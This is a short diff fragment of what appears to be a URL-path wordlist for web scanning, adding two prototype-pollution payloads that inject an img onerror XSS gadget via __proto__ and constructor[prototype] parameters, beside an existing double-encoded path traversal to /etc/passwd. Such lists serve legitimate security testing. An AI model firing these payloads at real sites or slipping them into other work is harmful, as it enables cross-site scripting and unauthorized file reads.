@@ -96,3 +96,5 @@
 /js/log.js
 /{{route}}
 /%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd
+/?__proto__%5Bcontext%5D=%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3E&__proto__%5Bjquery%5D=x
+/?constructor%5Bprototype%5D%5Bcontext%5D=%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3E&constructor%5Bprototype%5D%5Bjquery%5D=x
